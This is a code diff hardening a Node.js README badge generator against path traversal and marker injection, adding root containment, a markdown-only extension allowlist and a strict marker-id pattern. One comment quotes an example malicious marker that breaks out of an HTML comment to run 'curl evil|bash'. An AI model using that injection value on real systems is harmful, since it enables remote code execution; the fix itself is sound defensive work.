@@ -1,10 +1,57 @@
 // README Badges service implementation (ESM, Node 20+)
 import { promises as fs } from 'node:fs';
-import { join } from 'node:path';
+import { join, resolve } from 'node:path';
+import { resolveWithinRoot } from '../../../src/utils/path-guard.js';
 import { toMarkdownBadge } from './utils.js';
 
 const DEFAULT_STYLE = 'for-the-badge';
 const DEFAULT_LOGO_COLOR = 'fff';
+
+/**
+ * Directory that every caller-supplied path must stay inside.
+ *
+ * `readmePath` and `rootDir` arrive from unauthenticated HTTP request bodies, so
+ * without containment they are an arbitrary-file read/write primitive
+ * (GHSA-5x56-587v-mv4r, GHSA-42v3-pcpq-j7fq). Operators can point the module at
+ * a different tree with README_BADGES_ROOT; the default is the process working
+ * directory, which is the project this module is meant to badge.
+ *
+ * Read lazily so tests and embedders can set the variable before first use.
+ * @returns {string}
+ */
+function projectRoot() {
+  return resolve(process.env.README_BADGES_ROOT || process.cwd());
+}
+
+/**
+ * Markdown files the badge writer is allowed to touch. Restricting the extension
+ * keeps the primitive away from shell profiles, `authorized_keys`, service units
+ * and source files even if the root is set wide.
+ */
+const ALLOWED_README_EXTENSIONS = ['.md', '.markdown', '.mdx'];
+
+/**
+ * Marker ids become HTML comment delimiters in the output. Without validation a
+ * marker such as `x -->\ncurl evil|bash\n#` closes the comment early and injects
+ * attacker-authored lines into the target file, which is what turns the write
+ * into code execution when a shell profile is targeted.
+ */
+const MARKER_PATTERN = /^[A-Za-z0-9_-]{1,64}$/;
+
+/**
+ * Validate a marker id.
+ * @param {string} marker
+ * @returns {string} the validated marker
+ * @throws {Error} when the marker could break out of the comment delimiters
+ */
+function assertSafeMarker(marker) {
+  if (typeof marker !== 'string' || !MARKER_PATTERN.test(marker)) {
+    throw new Error(
+      'Invalid marker: must be 1-64 characters of letters, numbers, hyphen or underscore'
+    );
+  }
+  return marker;
+}
 
 // Minimal, opinionated badge presets to cover common stack keys.
 // Note: No external destination URLs here; links are supplied via githubUrl or linkMap.
@@ -156,12 +203,21 @@ async function updateReadme({
   if (!readmePath) throw new Error('readmePath is required');
   if (!Array.isArray(badges)) throw new Error('badges must be an array');
 
+  assertSafeMarker(marker);
+
+  // Contain the caller-supplied path before it reaches any fs call.
+  const safeReadmePath = resolveWithinRoot(readmePath, {
+    root: projectRoot(),
+    allowedExtensions: ALLOWED_README_EXTENSIONS,
+    fieldName: 'readmePath',
+  });
+
   const markdown = generate({ badges, githubUrl, linkMap });
   const block = buildMarkerBlock({ marker, content: markdown });
   const startToken = `<!-- ${marker}:start -->`;
   const endToken = `<!-- ${marker}:end -->`;
 
-  const original = await safeRead(readmePath);
+  const original = await safeRead(safeReadmePath);
 
   // If markers already exist, replace content
   const startIdx = original.indexOf(startToken);
@@ -206,7 +262,7 @@ async function updateReadme({
 
   const changed = updated !== original;
   if (changed) {
-    await fs.writeFile(readmePath, updated, 'utf8');
+    await fs.writeFile(safeReadmePath, updated, 'utf8');
   }
 
   return {
@@ -223,11 +279,18 @@ async function updateReadme({
  * @param {string} [params.rootDir=process.cwd()]
  * @returns {Promise<string[]>} list of badge keys
  */
-async function detectTech({ rootDir = process.cwd() } = {}) {
+async function detectTech({ rootDir } = {}) {
   const detected = new Set();
 
+  // `rootDir` is caller-supplied too; contain it so detection cannot be used to
+  // probe for, or read, package.json files elsewhere on the filesystem.
+  const safeRootDir =
+    rootDir === undefined || rootDir === null
+      ? projectRoot()
+      : resolveWithinRoot(rootDir, { root: projectRoot(), fieldName: 'rootDir' });
+
   // If package.json exists, assume Node
-  const pkgPath = join(rootDir, 'package.json');
+  const pkgPath = join(safeRootDir, 'package.json');
   let pkg;
   try {
     const txt = await fs.readFile(pkgPath, 'utf8');
